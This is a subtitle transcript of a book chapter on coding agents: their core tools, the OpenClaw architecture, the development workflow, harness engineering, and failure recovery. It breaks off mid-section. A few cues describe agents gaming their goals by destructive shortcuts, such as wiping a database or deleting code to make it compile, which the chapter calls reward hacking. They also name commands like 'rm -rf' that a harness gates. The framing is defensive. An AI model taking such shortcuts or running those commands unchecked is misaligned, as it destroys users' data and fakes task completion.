WEBVTT

1
00:00:00.100 --> 00:00:04.512
Chapter 5: Coding Agents and General-Purpose Agents .

2
00:00:04.462 --> 00:00:12.350
The previous chapters delved into context engineering (Chapters 2 and 3) and tool design (Chapter 4).

3
00:00:12.350 --> 00:00:22.312
This chapter puts those building blocks together to answer a core question: What does the architecture of a general-purpose Agent capable of handling arbitrary tasks look like?

4
00:00:22.312 --> 00:00:43.212
The answer is: A general-purpose Agent targeting open-ended tasks has at its core a Coding Agent (an Agent that can autonomously write, modify, and execute code) plus a file system — the workspace where the Agent stores code, data, memory, and intermediate results, much as a programmer manages projects with folders on a computer.

5
00:00:43.212 --> 00:00:49.662
From Manus to OpenClaw, successful open-ended general-purpose Agents all follow this paradigm.

6
00:00:49.662 --> 00:00:52.750
Why can code generation carry this weight?

7
00:00:52.750 --> 00:01:01.150
Because it is not merely a tool, but a meta-capability — the ability to create new tools and capabilities dynamically at runtime.

8
00:01:01.150 --> 00:01:07.962
The latter half of this chapter develops this concept in full, along with the six directions in which it applies.

9
00:01:07.962 --> 00:01:11.037
Code serves an Agent on two levels.

10
00:01:11.037 --> 00:01:22.325
As a medium for thinking, code enforces rigor — "age greater than 18 and identity verified" admits multiple readings in natural language, but written as code it admits exactly one.

11
00:01:22.325 --> 00:01:31.887
As a medium for expression, code that runs is its own proof of logical consistency, and its execution result provides an objective standard of correctness.

12
00:01:31.887 --> 00:01:48.037
This chapter begins with the basic capabilities of a Coding Agent and the general-purpose Agent architecture (OpenClaw), then demonstrates the application of code generation in various scenarios — from mathematical reasoning and content creation to system-level meta-capabilities.

13
00:01:48.037 --> 00:01:49.862
Coding Agent.

14
00:01:49.862 --> 00:01:53.262
Coding as a Foundational Agent Capability.

15
00:01:53.262 --> 00:02:02.462
Code generation is not the exclusive domain of a few specialized Agents, but a foundational capability that every general-purpose Agent should possess.

16
00:02:02.462 --> 00:02:09.075
With today's SOTA models, giving an Agent basic coding ability requires no elaborate architecture.

17
00:02:09.075 --> 00:02:18.000
Consider a typical task: "Organize all leftover TODO comments in the repository, classify them by priority, and generate issues.

18
00:02:18.000 --> 00:02:32.012
Getting it done requires browsing the directory structure (ls/glob), reading code (read), modifying files (edit/write), running commands (bash), and searching for patterns (grep/search).

19
00:02:32.012 --> 00:02:40.325
These five categories of operations cover almost every core action of a Coding Agent, and they are where the seven tools below come from.

20
00:02:40.325 --> 00:03:00.150
Strictly speaking, the five categories map naturally onto six tools; the seventh, the Code Interpreter, covers "execute code / compute" operations and in some implementations is simply folded into Bash — the seven tools are a normalized reference set, not a strict one-to-one mapping onto the five categories.

21
00:03:00.150 --> 00:03:05.587
A basic Coding Agent only needs to be equipped with the following seven core tools:

22
00:03:05.587 --> 00:03:17.262
Code Interpreter: Provides an isolated sandbox (a secure runtime separated from the host system) in which Python code can run safely without execution errors affecting the host

23
00:03:17.262 --> 00:03:24.862
Bash Shell: Executes commands in a terminal, such as running test cases or processing specially formatted files

24
00:03:24.862 --> 00:03:31.900
Read File Tool: Reads code, configuration, documentation, logs, etc.

25
00:03:31.900 --> 00:03:37.762
Write File Tool: Creates new files or completely overwrites existing files

26
00:03:37.762 --> 00:03:46.175
Edit File Tool: Performs partial modifications to existing files, a core operation for code maintenance and iteration

27
00:03:46.175 --> 00:03:58.325
Search File Name Tool (Glob): Quickly locates target files in the file system via pattern matching, e.g., using */.py to find all Python files in a project

28
00:03:58.325 --> 00:04:08.300
Search File Content Tool (Grep): Searches for specific text patterns within file content, e.g., finding all lines of code that call a certain function

29
00:04:08.300 --> 00:04:15.537
These seven tools constitute a complete yet minimal toolbox that almost any Agent system can integrate at low cost.

30
00:04:15.700 --> 00:04:33.050
Note that this tool set is the base configuration specific to a Coding Agent, and differs from the five general tool categories of Chapter 4, which were divided by call direction and nature of effect (perception / execution / collaboration / event-triggered / user communication).

31
00:04:33.000 --> 00:04:37.425
These seven core tools mainly cover perception and execution.

32
00:04:37.425 --> 00:04:46.762
Collaboration, event handling, and user communication still require additional tools, but those fall outside a Coding Agent's core tool set.

33
00:04:46.762 --> 00:04:51.700
To see how the seven tools work together, take the simplest of tasks.

34
00:04:51.700 --> 00:04:57.387
Suppose the user says, "Help me compile a list of all TODO comments in the project"

35
00:04:57.387 --> 00:05:02.125
Refer to the companion repository for the complete code implementation.

36
00:05:02.125 --> 00:05:09.175
The entire process used only two tools: Grep (search content) and Write (write file).

37
00:05:09.175 --> 00:05:21.037
If the task were more complex — like "count the number of TODOs per module and draw a bar chart" — the Agent would also use the Code Interpreter to execute Python code for statistics and plotting.

38
00:05:21.037 --> 00:05:27.412
The seven tools are simple individually; in combination they cover a remarkable range of tasks.

39
00:05:27.412 --> 00:05:31.675
A reader might ask: why seven tools and not six?

40
00:05:31.675 --> 00:05:36.225
In fact, a single Bash tool can cover most operations.

41
00:05:36.225 --> 00:05:59.112
OpenAI Codex's toolset is extremely lean: the shell is its only general-purpose execution entry point, and it browses directories, finds files, and reads them through commands; file modifications go to a syntax-constrained apply_patch tool, which expresses an edit as a structured patch rather than a free-form text command and so lowers the chance of changing the wrong file.

42
00:05:59.112 --> 00:06:04.300
Other Agents nevertheless keep dedicated file-reading and file-writing tools.

43
00:06:04.300 --> 00:06:11.550
The seven tools in this book are broken out separately to make the basic capabilities a Coding Agent needs easy to grasp.

44
00:06:11.550 --> 00:06:15.287
Why should every general-purpose Agent have coding ability?

45
00:06:15.287 --> 00:06:22.225
Because code generation is not just about writing programs — it is a general-purpose way of solving problems.

46
00:06:22.225 --> 00:06:40.712
Faced with a math problem, the Agent can write code and hand it to a solver for an exact answer; faced with a business rule to pin down, code is far more precise than any natural-language description; missing a tool, it can write one on the spot; when a data format changes, it can generate new parsing logic.

47
00:06:40.712 --> 00:06:44.587
Later sections take up each of these scenarios in turn.

48
00:06:44.587 --> 00:06:54.500
An Agent with basic coding ability — even one equipped with nothing but the seven simple tools above — can expand its capabilities whenever a new need arises.

49
00:06:54.500 --> 00:07:00.400
Case Study: From Manus to OpenClaw — The Coding Core of General-Purpose Agents.

50
00:07:00.400 --> 00:07:10.775
General-purpose Agent products such as Manus and OpenClaw combine three major capabilities — Deep Research, Computer Use, and Coding — in a single system.

51
00:07:10.775 --> 00:07:17.225
Why, then, did the beginning of this chapter call the Coding Agent the core rather than either of the other two?

52
00:07:17.225 --> 00:07:22.425
Because almost all efficient content generation ultimately boils down to code.

53
00:07:22.425 --> 00:07:32.650
PowerPoint presentations and Word documents are essentially code in the OOXML format (Office Open XML, Microsoft's open standard for office documents).

54
00:07:32.650 --> 00:07:49.200
PDF reports can be generated through Markdown, HTML, or LaTeX; Python scripts can perform data analysis and visualization; even successful browser-operation sequences from GUI work can be captured as reusable code (see Chapter 9).

55
00:07:49.200 --> 00:07:55.787
Deep Research search and information synthesis can be implemented through code-driven web requests and parsing.

56
00:07:55.787 --> 00:08:05.125
Computer Use is more versatile, but direct code or API calls are generally cheaper, faster, and more reliable for equivalent operations.

57
00:08:05.125 --> 00:08:11.612
Code generation is the most efficient, lowest-cost, and most reusable capability foundation.

58
00:08:11.612 --> 00:08:17.637
As illustrated in Figure 5-1: Coding Agent Core in OpenClaw Architecture.

59
00:08:17.637 --> 00:08:21.887
Understand this architecture through a concrete execution flow.

60
00:08:21.887 --> 00:08:28.350
Suppose the user asks: "Help me analyze last quarter's sales data and create a summary report.

61
00:08:28.350 --> 00:08:37.212
Read Memory: The Agent reads MEMORY.md and discovers the user prefers PDF format reports and the data source is Google Sheets

62
00:08:37.372 --> 00:08:46.359
Call Tools: Obtains usage instructions for the Google Sheets API via the web search module, downloads data via code execution

63
00:08:46.309 --> 00:08:53.959
Write Code: Generates a data analysis script in Python (pandas aggregation, matplotlib visualization)

64
00:08:53.959 --> 00:09:01.534
Generate Artifacts: Writes the analysis results to report.pdf, charts to the charts/ directory

65
00:09:01.534 --> 00:09:11.359
Update Memory: Records in MEMORY.md that "User's sales data is in Google Sheets, ID: xxx," so it doesn't need to ask next time

66
00:09:11.359 --> 00:09:22.534
Throughout the process, the file system is the hub of information flow — memory is read from files, artifacts are written to files, and experience is also saved as files.

67
00:09:22.534 --> 00:09:25.772
The File System as the Agent's Central Hub.

68
00:09:25.772 --> 00:09:34.997
In OpenClaw's design, the file system is far more than data storage — it is the central hub for the Agent's memory, knowledge, and capabilities.

69
00:09:34.997 --> 00:09:43.972
The Agent's long-term memory is stored in MEMORY.md (high-level facts and user preferences) and Markdown logs archived by date.

70
00:09:43.972 --> 00:10:06.322
Choosing Markdown over a vector database may seem counterintuitive, but it is extremely effective: users can directly open files to read and modify the Agent's memory (if the Agent misremembers something, just delete that line), Markdown naturally preserves chronological order to avoid temporal confusion in semantic retrieval, and it supports version control and rollback via Git.

71
00:10:06.322 --> 00:10:14.009
More critically, because the Agent can write files, it has the technical means to modify its own external artifacts.

72
00:10:14.009 --> 00:10:29.497
When an Agent performs a task for the first time and discovers key information it did not previously know—for example, when calling a particular bank, it learns that the bank requires the branch address for identity verification—it can first write the discovery into a record.

73
00:10:29.497 --> 00:10:39.247
Determining when such a record is sufficient to become reliable knowledge, an instruction, or a program still requires additional trajectories and outcome validation.

74
00:10:39.247 --> 00:10:43.872
This is the problem of continuous evolution discussed in Chapter 9.

75
00:10:43.872 --> 00:10:48.859
Applicability Boundary: Which Agents Have Coding as Their Core Architecture.

76
00:10:48.859 --> 00:11:06.059
The conclusion that "the Coding Agent is the core of a general-purpose Agent" mainly applies to general-purpose Agents targeting open-ended tasks — scenarios like deep research, content generation, and data processing, where task boundaries are uncertain and artifact forms are diverse.

77
00:11:06.059 --> 00:11:20.959
In these scenarios, it is impossible to enumerate all needed tools in advance; code generation, as a meta-capability, provides the most economical path for dynamically expanding capability boundaries, making it the core of the architecture.

78
00:11:20.959 --> 00:11:37.447
By contrast, vertical-domain customer-service Agents operate in relatively closed task spaces, with core architectures built around fixed business processes, domain tools, and dialogue strategies; there, code is a tool in the toolbox rather than the architectural hub.

79
00:11:37.447 --> 00:11:47.709
However, even in the latter, coding is an important foundational capability: precise calculation, data processing, and rule verification all depend on it.

80
00:11:47.709 --> 00:11:50.997
The Overall Workflow of a Coding Agent.

81
00:11:50.997 --> 00:11:55.834
As illustrated in Figure 5-2: Coding Agent Workflow.

82
00:11:55.834 --> 00:11:58.159
Project Documentation.

83
00:11:58.159 --> 00:12:03.159
A Coding Agent's work begins with a systematic understanding of the project.

84
00:12:03.159 --> 00:12:17.434
When an Agent first encounters a code repository, its first job is not to start modifying code but to build a cognitive framework for the whole project—just as a new engineer doesn't push code on day one, but starts by learning the lay of the land.

85
00:12:17.434 --> 00:12:25.722
The Agent begins by checking whether the project has documentation—a README, architecture design documents, developer guides.

86
00:12:25.722 --> 00:12:30.647
If key documents are missing, the Agent should not start working blindly.

87
00:12:30.647 --> 00:12:44.072
It should systematically inspect the codebase, identify the main modules, core abstractions, and component dependencies, and draft an architecture overview, directory guide, and instructions for running tests.

88
00:12:44.072 --> 00:12:50.734
These documents serve as a blueprint for the Agent's subsequent work and provide an entry point for other developers.

89
00:12:50.734 --> 00:12:57.634
This embodies a key principle: making project knowledge explicit is a prerequisite for efficient collaboration.

90
00:12:57.796 --> 00:13:03.883
Project documentation now has a form specific to Agents: Project Instruction Files.

91
00:13:03.833 --> 00:13:17.246
Files like CLAUDE.md, AGENTS.md, .cursorrules have become de facto industry standards—they are automatically injected into the context at the start of every session, acting as project-level system prompts.

92
00:13:17.246 --> 00:13:35.171
Unlike READMEs intended for human readers, instruction files carry behavior conventions for Agents: build and test commands ("use pnpm test instead of npm test"), code style ("avoid the any type"), and clear restricted zones ("do not modify the migrations/ directory").

93
00:13:35.171 --> 00:13:54.096
This is the same idea as OpenClaw's SOUL.md (defining the Agent's identity and behavior rules) and MEMORY.md (accumulating cross-session experience), applied at different levels: SOUL.md defines "who the Agent is," while project instruction files define "how to work in this project.

94
00:13:54.096 --> 00:14:12.771
From the perspective of context engineering in Chapter 2, instruction files are also the most economical stable prefix—their content doesn't change with the task, making them naturally KV Cache-friendly; they are also the most direct implementation of the principle that "knowledge must exist within the codebase itself.

95
00:14:12.771 --> 00:14:32.646
This is exactly where Chapter 2's judgment—"a team friendly to remote work is usually friendly to AI Agents too"—lands at the level of the code repository: decisions recorded in documents, context written into issue and PR descriptions, internal experience distilled into a developer guide, so that the Agent can read them at all.

96
00:14:32.646 --> 00:14:43.496
From this follows a simple gauge of how "AI-ready" a team is: can a remote newcomer, relying only on the repository and the documentation, start working independently?

97
00:14:43.496 --> 00:14:47.196
Task Understanding and Requirements Clarification.

98
00:14:47.196 --> 00:14:58.471
For simple requirements with clear boundaries and limited impact—such as fixing a known bug or adjusting a function's parameters—the Agent can proceed directly to the implementation phase.

99
00:14:58.471 --> 00:15:02.996
However, most tasks in software development are not this simple.

100
00:15:03.148 --> 00:15:08.235
For complex requirements, the Agent must be more cautious and methodical.

101
00:15:08.185 --> 00:15:29.335
Complexity can arise from multiple dimensions: the ambiguity of the requirement itself (the user knows what they want but cannot express it precisely), the diversity of implementation paths (multiple technical solutions with their own trade-offs), or the breadth of impact (requiring modifications to multiple modules, potentially breaking existing functionality).

102
00:15:29.335 --> 00:15:37.160
The Agent should clarify boundaries through exploratory research and proactively engage in dialogue with the user when necessary.

103
00:15:37.160 --> 00:15:57.010
For example, when a user asks to "optimize system performance," the Agent first needs to determine the specific goal (reducing response time, decreasing memory usage, or increasing throughput), which trade-offs are acceptable (for example, whether increased code complexity is acceptable), and where the current bottleneck lies.

104
00:15:57.010 --> 00:16:02.523
Starting to code while the requirements are still vague often leads to significant rework.

105
00:16:02.523 --> 00:16:04.948
Writing a Design Document.

106
00:16:04.948 --> 00:16:11.523
A design document is a bridge that translates abstract requirements into a concrete implementation plan.

107
00:16:11.523 --> 00:16:24.923
It should answer four core questions: which modules should be modified and why, which approach should be chosen and what trade-offs it entails, which new dependencies are needed, and what impact the changes are expected to have on the system.

108
00:16:24.923 --> 00:16:34.598
Writing a design document is itself deep thinking—it forces the Agent to conceptually validate the feasibility of a solution before investing heavily in coding.

109
00:16:34.598 --> 00:16:45.323
More importantly, the design document provides an efficient intervention point for humans—reviewing a concise design document is much easier than reviewing hundreds of lines of code.

110
00:16:45.323 --> 00:16:52.385
After completing the design document, the Agent should submit it for user review and wait for approval before proceeding.

111
00:16:52.385 --> 00:16:55.110
Code Implementation and Testing.

112
00:16:55.110 --> 00:17:08.748
After obtaining design approval, the Agent follows the project's code conventions for implementation, reuses existing abstractions and tools, and performs moderate refactoring when necessary to maintain the health of the codebase.

113
00:17:08.748 --> 00:17:22.198
After implementation, the Agent immediately enters a test-driven quality assurance phase—writing test cases for the new or modified functionality, covering normal paths, boundary conditions, and error scenarios.

114
00:17:22.198 --> 00:17:26.573
After writing the tests, the Agent executes the test suite.

115
00:17:26.573 --> 00:17:37.060
If tests fail, the Agent should not simply report the failure to the user but should analyze the cause, locate the problem, and modify the code until all tests pass.

116
00:17:37.060 --> 00:17:47.760
This "test-fix" loop may require several iterations, and it is this self-correcting ability that elevates a Coding Agent from a code generator to a reliable engineering assistant.

117
00:17:47.760 --> 00:17:58.185
Conversely, the most common way a Coding Agent slacks off is to skip this stage entirely—writing the code and reporting "task complete" without ever running the tests.

118
00:17:58.185 --> 00:18:09.973
Defining "tests pass," rather than "code written," as the completion criterion is precisely Loop Engineering's principle of letting verification decide when it is safe to stop, applied to coding.

119
00:18:09.973 --> 00:18:14.185
Even if all tests pass, the Agent's work is not done.

120
00:18:14.185 --> 00:18:19.985
The next phase is code review: the Agent critically examines its own generated code.

121
00:18:19.985 --> 00:18:22.960
Is it readable and adequately commented?

122
00:18:22.960 --> 00:18:27.185
Are there lurking performance problems or security vulnerabilities?

123
00:18:27.185 --> 00:18:31.285
Does it follow the project's code style and best practices?

124
00:18:31.285 --> 00:18:38.560
This self-review can be done by reading the code, running lint tools, or calling a dedicated code review sub-agent.

125
00:18:38.560 --> 00:18:46.935
If the review finds issues, the Agent should return to the modification phase and fix them, rather than delivering flawed code to the user.

126
00:18:46.935 --> 00:18:50.348
Documentation Synchronization and Delivery.

127
00:18:50.500 --> 00:19:05.150
If the code changes involve architectural changes—such as introducing a new module, changing dependencies between modules, or altering the semantics of core abstractions—the Agent needs to update the architecture documentation accordingly.

128
00:19:05.100 --> 00:19:11.137
Outdated documentation is worse than no documentation because it misleads future developers.

129
00:19:11.137 --> 00:19:20.625
By automatically updating documentation after every significant change, the Agent helps maintain the integrity and timeliness of the project's knowledge base.

130
00:19:20.625 --> 00:19:31.200
This workflow embodies the core principles of software engineering: planning precedes action, verification runs throughout, and documentation evolves together with the code.

131
00:19:31.200 --> 00:19:36.075
Note that the process described above is a recommended engineering workflow.

132
00:19:36.075 --> 00:19:49.575
Real-world Coding Agents (such as Claude Code and Codex) trim it as needed: a simple bug-fix task skips generating a design document, while only complex, wide-reaching tasks go through every stage in full.

133
00:19:49.575 --> 00:19:53.225
Different models trim this workflow in different ways.

134
00:19:53.225 --> 00:20:01.025
Some Coding models read the repository structure, implementation, callers, and tests broadly before the first edit.

135
00:20:01.025 --> 00:20:09.962
Others inspect only the few files most likely to matter, make an early patch, and treat compiler and test feedback as part of the investigation.

136
00:20:09.962 --> 00:20:21.162
This threshold for deciding when to stop gathering information and start acting can continue to follow the model after the harness changes, and can change when the model is swapped inside the same harness.

137
00:20:21.162 --> 00:20:27.900
It is therefore first and foremost a learned model behavior, not merely the interface style of a Coding product.

138
00:20:27.900 --> 00:20:35.112
Prompts, tools, and budgets in the harness can still amplify or suppress it, but need not be its source.

139
00:20:35.112 --> 00:20:43.650
Chapter 7 measures this difference in a fixed harness; Chapter 8 then explains how post-training may write such a policy into the parameters.

140
00:20:43.650 --> 00:20:47.225
Harness Engineering in Practice for Coding Agents.

141
00:20:47.225 --> 00:20:53.787
Chapter 1 introduced the concept of Harness Engineering and the formula Agent = Model + Harness.

142
00:20:53.787 --> 00:21:06.275
The Harness here includes the context and tools from the core formula, as well as constraints, verification, and correction mechanisms—these five elements together constitute the Harness defined in Chapter 1.

143
00:21:06.275 --> 00:21:19.800
Coding Agents are perhaps the domain where Harness Engineering pays off most—code writing is the most verifiable of all Agent tasks, and its constraints, verification, and correction can all lean on existing infrastructure.

144
00:21:19.800 --> 00:21:24.662
This section focuses on concrete practice in the Coding Agent scenario.

145
00:21:24.662 --> 00:21:32.675
Whether a system runs stably often depends less on the power of the model and more on the robustness of the infrastructure built around the Agent.

146
00:21:32.675 --> 00:21:44.937
Chapter 1 divides the Harness into two layers—Context and Tools (enabling the Agent to act) and Constraints, Verification, and Correction (helping the Agent act safely and correctly).

147
00:21:44.937 --> 00:21:50.525
In the Coding Agent scenario, these translate into specific engineering components:

148
00:21:50.525 --> 00:22:03.687
Acceptance Baseline: What constitutes "done"—test suites, CI pipeline (Continuous Integration pipeline, a series of checks automatically run after code submission), code review standards

149
00:22:03.687 --> 00:22:12.050
Execution Boundary: What the Agent can and cannot touch—module boundaries, dependency rules, permission controls

150
00:22:12.050 --> 00:22:24.762
Feedback Signals: Automated correctness judgments—Linter (code style checking tool that can automatically find formatting errors and potential issues) output, test results, type checking errors

151
00:22:24.762 --> 00:22:33.637
Rollback Mechanism: How to recover if something goes wrong—Git version control, sandbox isolation, snapshot rollback

152
00:22:33.637 --> 00:22:38.125
Why Coding Agents Are Particularly Suitable for Harness Engineering.

153
00:22:38.284 --> 00:22:46.246
Two dimensions — how clear the goal is, and how automated the verification is — divide tasks into four states.

154
00:22:46.196 --> 00:23:04.809
A clear goal with automatically verifiable results is the territory where Agents thrive; a clear goal whose acceptance still depends on human eyes caps throughput at the speed of human review; automated feedback with a vague goal lets the system run efficiently in the wrong direction; lacking both, the Agent is of little use.

155
00:23:04.809 --> 00:23:08.446
Table 5-1 shows these four states.

156
00:23:08.446 --> 00:23:16.159
The goal of the Harness is to push as many tasks as possible into the "clear goal + automated verification" quadrant.

157
00:23:16.159 --> 00:23:21.721
Table 5-1 Four Quadrants of Task Clarity and Verification Automation

158
00:23:21.721 --> 00:23:33.884
Results can be automatically verified: Sweet spot: fixing bugs with test cases; Results require manual verification: Throughput-limited: code refactoring requires manual review.

159
00:23:33.884 --> 00:23:46.609
Results can be automatically verified: Efficiently going off track: optimizing "code quality" with a linter; Results require manual verification: Hard to start: "make the UI look better".

160
00:23:46.609 --> 00:24:03.459
Code-writing tasks naturally occupy the "clear goal + automated verification" quadrant—test suites provide clear acceptance criteria, linters and type checkers offer instant automated verification, and Git provides perfect version control and rollback capabilities.

161
00:24:03.459 --> 00:24:17.696
This explains why Coding Agents are currently the most mature among all Agent types: not because code generation models are particularly powerful, but because decades of software engineering infrastructure naturally constitute a robust Harness.

162
00:24:17.696 --> 00:24:19.834
Industry Practice.

163
00:24:19.834 --> 00:24:24.359
Three case studies of Harness practice confirm the above principles:

164
00:24:24.359 --> 00:24:48.971
Large-scale code migration case (from a large tech company's publicly shared large-scale code migration practice): The key was not the model's strength, but the Harness doing three things right—knowledge must exist within the codebase itself (what the Agent cannot see does not exist), constraints are encoded into linters and CI rather than written in documentation, and verification and correction are fully automated end-to-end.

165
00:24:48.971 --> 00:24:59.284
LangChain: Significantly improved benchmark task performance solely by optimizing the Harness (system prompts, tool middleware, self-verification loops).

166
00:24:59.284 --> 00:25:10.309
Particularly noteworthy is the methodology of "using an Agent to analyze failure trajectories to improve the Harness," shifting Harness engineering from experience-driven to data-driven.

167
00:25:10.309 --> 00:25:29.934
Anthropic: Splits long tasks into two roles—an initialization Agent responsible for breaking down large tasks into a task list, and an execution Agent responsible for progressing step by step, leaving intermediate results (such as completed code files and updated task lists) for the next round to continue using.

168
00:25:29.934 --> 00:25:37.984
This division of labor solves the problem of long-running Agents "trying to do too much at once" or "claiming completion prematurely.

169
00:25:37.984 --> 00:25:41.946
From Coding Agent to General Harness Design Principles.

170
00:25:41.946 --> 00:25:48.496
The Harness practices of Coding Agents provide transferable design principles for all Agent systems:

171
00:25:48.496 --> 00:25:56.146
Constraints over guidance: Rules that can be enforced with code should be encoded there, not merely suggested in documentation.

172
00:25:56.146 --> 00:26:02.684
The value of linter rules, type constraints, and CI checks far exceeds "please follow...

173
00:26:02.684 --> 00:26:09.871
guidance in system prompts—the former means "cannot be done," the latter is merely "advised against.

174
00:26:09.871 --> 00:26:14.796
Automate verification: Manual review is an unscalable bottleneck.

175
00:26:14.796 --> 00:26:22.984
Investment in test suites, code quality checks, and behavior monitoring yields far higher returns than adding more human effort.

176
00:26:22.984 --> 00:26:33.134
Feedback should be as fast and structured as possible: The more detailed the error message and the closer it is to the moment of error, the more efficiently the Agent can correct itself.

177
00:26:33.134 --> 00:26:41.271
The Agent status bar techniques from Chapter 2 (detailed error messages, tool call counters) embody this principle.

178
00:26:41.271 --> 00:26:47.609
Rollback must be reliable: Agents can only experiment boldly when operating within a safety net.

179
00:26:47.609 --> 00:26:54.346
Git branches, sandbox environments, and snapshot mechanisms ensure any error is reversible.

180
00:26:54.508 --> 00:26:58.895
A deeper purpose of constraints: preventing process errors.

181
00:26:58.845 --> 00:27:08.583
The acceptance baseline governs whether the outcome is right; the execution boundary governs the process—even a correct outcome does not justify a wrong method.

182
00:27:08.583 --> 00:27:20.983
Deleting and rebuilding the database to "fix" a database fault does repair it, but the data is gone; deleting all the code to fix a compilation error does make compilation pass, but the implementation is gone.

183
00:27:20.983 --> 00:27:35.108
Such destructive shortcuts always exist: even when restrictions are written into the final evaluation metrics, Agents often find ways around them—this is the everyday form of reward hacking (Chapter 8) in Agent tasks.

184
00:27:35.108 --> 00:27:53.108
A production Harness therefore places dedicated checks and approvals on dangerous actions like rm -rf, deleting production data, or overwriting an unread file (semantic parsing in this chapter's security section, Sidecar review in Chapter 4), constraining actions, not merely outcomes.

185
00:27:53.108 --> 00:28:14.008
RLVP in Chapter 8 (Reinforcement Learning with Verified Penalty—"reward the outcome, penalize the path") answers the same question from the training side: beyond the final outcome reward, it penalizes verifiable violations along the path, internalizing "no destructive means" as the model's engineering common sense.

186
00:28:14.008 --> 00:28:23.095
For an existing model, Harness guardrails are external constraints; for a trainable model, process penalties internalize the same constraints.

187
00:28:23.095 --> 00:28:25.183
The goal is the same.

188
00:28:25.183 --> 00:28:28.808
Tool Orchestration: Fault Boundary Control.

189
00:28:28.808 --> 00:28:32.733
Mature Coding Agents support parallel tool calls.

190
00:28:32.733 --> 00:28:41.195
The unique problem from the Harness perspective is how faults propagate: when one tool fails, which calls should be aborted and which should continue?

191
00:28:41.195 --> 00:28:48.370
The principle is that faults propagate only within the same batch of parallel calls, not up to the parent operation.

192
00:28:48.370 --> 00:28:58.633
When reading three files in parallel, for example, a missing file should cause only that call to fail; it should neither cancel the other two nor abort the entire task.

193
00:28:58.633 --> 00:29:06.170
This fine-grained fault boundary control avoids the fragile pattern of "one command failure aborting the entire task.

194
00:29:06.170 --> 00:29:15.783
The specific mechanisms for parallel calls, streaming parsing, and cascading aborts are detailed in the "Implementation Tips" section of this chapter.

195
00:29:15.783 --> 00:29:18.320
Failure and Error Recovery.

196
00:29:18.320 --> 00:29:29.270
The previous section presented the principles and components of Harness engineering; this section dives into the piece that most differentiates engineering maturity—failure and error recovery.

197
00:29:29.270 --> 00:29:43.420
The ablation experiment in Chapter 1 showed how severe the problem can be: missing a single piece of tool-result feedback is enough to trap an Agent in an infinite loop—and real production environments see far more diverse failures than any experiment.

198
00:29:43.420 --> 00:29:49.820
This section systematically answers three questions: What failures does a production Harness encounter?

199
00:29:49.820 --> 00:29:52.583
How are they detected and recovered from?

200
00:29:52.583 --> 00:29:55.133
And when must the system terminate?

201
00:29:55.133 --> 00:29:58.695
A taxonomy of failures: four layers.

202
00:29:58.695 --> 00:30:02.945
The first step toward a systematic response is classification.

203
00:30:02.945 --> 00:30:06.883
Failures fall into four layers according to where they occur:

204
00:30:07.036 --> 00:30:18.236
API layer: rate limiting (HTTP 429), service overload, request timeouts, connection drops, and output truncated at the token limit.

205
00:30:18.186 --> 00:30:23.598
These failures are unrelated to the task itself—they are infrastructure noise.

206
00:30:23.598 --> 00:30:40.223
Tool layer: hallucinated calls (invoking a tool that does not exist), malformed arguments (violating the tool's input contract), execution exceptions, and the most dangerous kind—a tool repeatedly returning the same error while the model retries it unchanged.

207
00:30:40.223 --> 00:30:50.286
Context layer: context window overflow, compaction failure, and corrupted trajectory structure (such as a tool call missing its paired result message).

208
00:30:50.286 --> 00:31:03.373
Control-flow layer: infinite loops (repeating the same operation with no progress) and death spirals (recovery logic triggered by an error itself calls the LLM, fails again, and cascades).

209
00:31:03.373 --> 00:31:07.048
Detection: classify first, then count.

210
00:31:07.048 --> 00:31:13.611
When a failure occurs, the first question is not "Should we retry?" but "Would retrying help?

211
00:31:13.611 --> 00:31:32.111
Retryable errors (rate limiting, overload, network jitter) deserve retries; non-retryable errors (invalid arguments, insufficient permissions, nonexistent tool) will produce the same result no matter how many times they are retried as-is—the input or strategy must change.

212
00:31:32.111 --> 00:31:39.661
A production Harness maintains a mapping from error types to recovery strategies, rather than a blanket "retry on error.

213
00:31:39.661 --> 00:31:43.398
Beyond individual errors, detect patterns.

214
00:31:43.398 --> 00:31:58.948
First, repeated-call fingerprints: hash the "tool name + arguments" pair; the same fingerprint recurring is a clear signal of a no-progress loop—the Agent in Chapter 1's ablation experiment calling the same tool over and over was exactly this pattern.

215
00:31:58.948 --> 00:32:07.773
Second, consecutive-failure counters: each recovery path keeps its own counter, providing the basis for the circuit breakers discussed later.

216
00:32:07.773 --> 00:32:15.273
A third class of failures does not manifest as errors at all and requires dedicated liveness and integrity monitoring.

217
00:32:15.273 --> 00:32:28.861
The most dangerous failure mode of a streaming connection is not a drop (which immediately produces an error) but a silent stall—the connection remains established, but the data flow stops, like a connected pipe that yields no water.

218
00:32:28.861 --> 00:32:47.398
SDK timeouts often cover only the initial connection, not the transfer process, so a production Agent needs an independent idle watchdog (a watchdog timer—if no new output arrives within a set interval, the connection is judged stalled) that kills the hung stream and triggers a retry upon timeout.

219
00:32:47.398 --> 00:32:54.736
This generalizes into a principle: every long-lived connection needs a liveness signal, not just a connection timeout.

220
00:32:54.736 --> 00:33:08.336
Integrity monitoring targets trajectory structure: when a tool call is found to lack its paired result message, the system repairs the pairing before injecting the context, rather than throwing the structural anomaly at the model or the user.

221
00:33:08.336 --> 00:33:24.173
One notable engineering detail: some production Agents run both a production mode and a training-data collection mode—production mode may patch missing messages with placeholders, while training mode refuses to repair, because synthetic placeholders would pollute the training data.

222
00:33:24.173 --> 00:33:31.998
This "lenient in production, strict in training" dual standard reflects the deep coupling between the Harness and model training.

223
00:33:31.998 --> 00:33:36.298
Recovery: escalate through increasingly visible stages.

224
00:33:36.298 --> 00:33:43.798
Recovery measures are graded by how visible they are to the user; if a lower level solves the problem, do not escalate:

225
00:33:43.798 --> 00:33:45.836
Silent retry.

226
00:33:45.836 --> 00:33:49.098
The default action for retryable errors.

227
00:33:49.098 --> 00:34:19.261
Two details determine whether retries succeed: first, use exponential backoff with random jitter to prevent fleets of clients from retrying in lockstep and causing secondary congestion, while honoring the server's suggested wait duration; second, distinguish foreground from background calls—a failed main-loop request is retried, but auxiliary background calls (title generation, input suggestions) are dropped on failure, lest background retries crowd out the main loop's quota and create "retry

228
00:34:19.261 --> 00:34:21.123
amplification.

229
00:34:21.292 --> 00:34:23.404
Degrade and continue.

230
00:34:23.354 --> 00:34:27.867
When retries fail, change the request itself and try again.

231
00:34:27.867 --> 00:34:41.754
Take output truncation (generation cut off by the length limit): first silently resend with a raised output cap; if that is still not enough, append a meta-instruction at the end of the message so the model continues generation from the breakpoint.

232
00:34:41.754 --> 00:34:57.279
When the primary model is persistently overloaded, fall back to another model, first stripping proprietary formatting blocks from the previous model's history so that the new model can parse it; when a high-cost mode is rate-limited, temporarily fall back to the standard mode.

233
00:34:57.279 --> 00:34:59.429
